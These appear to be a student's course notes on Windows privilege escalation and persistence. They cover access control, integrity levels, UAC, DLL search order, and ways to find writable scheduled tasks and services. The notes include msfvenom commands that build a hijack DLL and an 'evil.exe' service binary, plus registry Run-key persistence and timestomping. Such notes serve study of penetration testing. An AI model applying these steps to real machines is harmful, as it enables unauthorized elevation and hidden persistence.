####################################################################################################################################################################################################

                                                                     #Privilege Escalation, Persistence, and Covering Your Tracks#

####################################################################################################################################################################################################
#Modes and Levels
    #Kernel Mode and User Mode
    #Privileged and Unprivileged

#Windows Access Control Module
    #Access Tokens
        #Security Identifier (SID) associations and Token associations
        #Contains info about a loggged on user
    #Security Descriptors   
        #Contains Security information
        #DACL
            #Discresionary Access Control List (says who do what)
        #SACL
            #System Access Control List (if not allowed to creates lod you did a bad)
        #ACEs

#DLL Search Order
    #Executables to check the following locations (in successive order)
          #HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
                                        |
                                        v
                    #The Directory the Application was run from
                                        |
                                        v
          #The directory specified in the C+ function GetSystemDirectory()
                                        |
                                        v
          #The directory specified in the C+ function GetWindowsDirectory()
                                        |
                                        v
                              #The current directory
#Windows Integrity Mechanism
    #Integrity Levels
        UNTRUSTED         #Anonymous SID access tokens
        LOW               #Everyone SID access token (World)
        MEDIUM            #Authenticated Users
        HIGH              #Administrators
        SYSTEM            #System services (LocalSystem, LocalService, NetworkService)
    
#User Account Control
    #Different settings
        #Always Notify
        #Notify me only when programs try to make changes to my computer
        #Notify me only when programs try to make changes to my computer (do not dim my desktop)
        #Never Notify
    #Checking UAC Settings
        reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

#AutoElevate Executables
    #Requeted Execution Levels
        asInvoker
            #uses priviliges of the user running it
        highestAvailable
            #runs as the highest level avalable to the user (administrator accounts will run as admin vs users stay as users, or if a user has admin privs it will run as an admin automatically)
    #Way to See
        #use sysinternals tool Sigcheck with a -m on the file path to the executable and scroll until you find the requested execution levels
    
#Scheduled Tasks & Services
    #can be a way a bad gut establishes persistence on our system
    #can check using sysinternals tool schtasks /query /fo LIST /v
        #Some options could be like
            schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch
                #Searches for Task To Run and excludes results that we dont want to see in order to narrow down vulnerable directory locations
    #Items to evaluate include
        #Write Permissions
        #Non-Standard Locations
        #Unquoted Executable Paths
        #Vulnerabilities in Executables
        #Permissions to Run as SYSTEM

sigcheck.exe <suspicious thing>
icacls <path to directory suspicious is in>

#When a Vulnerable or out of place scheduled task from long command above
    sigcheck.exe <suspicious thing>
    icacls <path to directory suspicious is in>
        #command line only not powershell
    procmon /AcceptEula
    #Run the found program
    #add Following filters to procmon
        Process Name is <name>
        Path contains .dll
        Result contains NAME NOT FOUND
            #all of these show the .dlls that the process is trying to run
    #Run msfvenom to hujack one of the dlls created to run commands based on it       
    msfvenom -p windows/exec CMD='cmd.exe /C whoami >c:\\whoami.txt' -f dll > SSPICLI.dll

#DLL Hijacking
    #Identify Vulnerability
    #Take Advantage of the default search order for DLLS
    #NAME_NOT_FOUND present in executable's system calls
    #Validate permissions
    #Create and Transfer malicious DLL
#How to find vulnerable services
    sc query
    wmic service list full
    services.msc
        #gui and nicer to use
    reg query
        reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s /v ImagePath | Select-String -Pattern "ImagePath" -CaseSensitive | Select-String -Pattern "system32" -NotMatch
        #shows the nontypical ones
#Once Identified do
    icacls <path to where sus stored>
    #create the thing in msfvenom but this time for full vinary
        msfvenom -p windows/exec CMD='cmd.exe /C whoami > c:\\whoami.txt' -f exe > evil.exe


#Persistance
    #Survives:
        #Reboots
        #Credential Changes
        #DHCP IP reassignment
        #Etc.
    #Considerations:
        #File Naming
        #File Location
        #Timestomping
        #Port Selection
    #Registry
          HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
              Run
              RunOnce
          HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
              Run
              RunOnce
    #Scheduled Tasks
        #Permission Levels Considerations
            #What is your objective
            #Do you need to blend in
    #Services
        #At Startup
        #Perform Multiple Functions
        #Typically require Administrative Access

#Audit Logging
    auditpol /get/category:*                                          #Show all audit category settings
    auditpol /get /category:* | findstr /i "success failure"          #

#Important Microsoft Event IDs
    4624/4625         #Successful/failed login
    4720              #Account Created
    4672              #Administrative user logged on
    7045              #service created













